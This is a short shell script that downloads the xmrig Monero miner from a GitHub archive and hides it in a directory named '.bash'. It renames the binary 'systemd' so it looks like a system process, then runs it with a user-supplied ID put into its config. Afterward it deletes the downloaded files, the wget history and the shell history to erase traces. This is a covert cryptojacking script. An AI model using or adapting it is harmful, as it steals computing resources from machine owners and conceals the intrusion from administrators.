echo "Enter Id:"
read Id
wget https://github.com/deusveritatis/monero/archive/master.zip
unzip master.zip
cd monero-master
tar -xvzf ./k.tar.gz
mv ./xmrig-2.14.1 ./.bash
sed -i 's/iiserb/'"$Id"'/g' config.json
mv ./config.json ./.bash/config.json
cd .bash/
mv ./xmrig ./systemd
./systemd
cd ../..
rm -r master.zip
rm -r ./monero-master
rm ./nv3v2
rm .wget-hsts
rm .bash_history && history && exit
